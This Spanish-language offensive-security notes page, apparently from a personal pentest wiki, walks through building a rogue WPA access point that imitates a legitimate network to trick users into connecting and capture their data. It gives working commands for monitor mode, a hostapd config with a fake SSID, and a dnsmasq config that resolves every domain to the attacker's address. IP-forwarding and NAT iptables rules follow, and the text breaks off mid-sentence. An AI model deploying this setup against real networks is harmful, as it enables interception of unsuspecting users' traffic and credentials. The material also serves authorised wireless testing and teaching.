# AP Rogue WPA

Un ataque **Access Point Rogue WiFi Protected Access** (**AP Rogue WPA**) implica en la creación de un punto de acceso falso que imite a un ap legítimo, con el objetivo de engañar a los usuarios para que se conecten a este y así capturar sus datos. 

--- 
# Explopiting AP Rogue WPA

Lo primero que necesitamos llevar a cabo es la configuración de la interfaz en modo monitor.

```bash
sudo ip link set {interface} down

sudo iw dev {interface} set type monitor

sudo ip link set {interface} up
```

Adicionalmente, para evitar conflictos con la creación del punto de acceso es importante que la configuración de canal del mismo coincida con la configuración de canal que usa nuestra interfaz.

```bash
# Check interface info
sudo iw dev {interface} info
# Set a specific channel 
sudo iw dev {interface} set channel 6
```

Ahora necesitamos hacer es instalar la herramienta `hostapd` la cual nos permitirá crear puntos de acceso Wi-Fi.

```bash
# In linux devices
sudo apt-get install hostapd
# In devices like Wi-Fi Pineaple Mark VII
opkg install hostapd
```

Tras la instalación de esta herramienta, necesitaremos crear un archivo de configuración para que `hostapd` pueda hacer uso de esta para la configuración y creación del falso AP.

- **/etc/hostapd/hostapd-wpa.conf**
```bash
interface={interface}
driver=nl80211
ssid={fake_ssid_name}
channel={channel}
hw_mode=g
wpa=2
wpa_passphrase={password_to_use}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

Una vez creado el archivo de configuración deberemos llevar a cabo la configuración de *DNS* y *DHCP* para que los clientes puedan conectarse al AP y recibir una dirección IP, para esto necesitaremos configurar un servidor DHCP y redirigir el tráfico DNS. Haremos uso de la herramienta `dnsmasq`. 

```bash
# In linux devices
sudo apt-get install dnsmasq
# In devices like Wi-Fi Pineaple Mark VII
opkg install dnsmasq
```

Una vez instalada la misma deberemos, una vez más, crear el archivo de configuración.

- **/etc/dnsmasq.conf** (Ejemplo de segmento de red *192.168.2.0*)
```c
interface={interface}
dhcp-range=192.168.2.10,192.168.2.100,12h 
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
address=/#/192.168.2.1
```

Tras la creación de estas configuraciones, tenemos que configurar la red, es decir nuestra interfaz:

```bash
ifconfig {interface} 192.168.2.1 netmask 255.255.255.0 up
```

Una vez configurada nuestra red, debemos iniciar tanto `hostapd` como `dnsmasq` con sus respectivas configuraciones...

```bash
# Starting hostapd with specific conf
hostapd /etc/hostapd/hostapd-wpa.conf
# Start dnsmasq using a config file 
dnsmasq -C /etc/dnsmasq.conf
```

Por último, simplemente deberíamos configurar el *IP Forwarding* y configurar *NAT* (Network Address Translation) para que finalmente los clientes puedan navegar.

- Habilitar IP Forwarding
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

- Configurar NAT (En el ejemplo se utiliza eth0 como interfaz con acceso a internet)
```bash
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i {interface_created} -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o {interface_created} -j ACCEPT
```

- `iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`: Regla de iptables que hace que todo el tráfico saliente desde cualquier interfaz se enmascare como si viniera desde nuestra interfaz con acceso a internet (eth0), permitiendo que los paquetes salgan a internet.   qu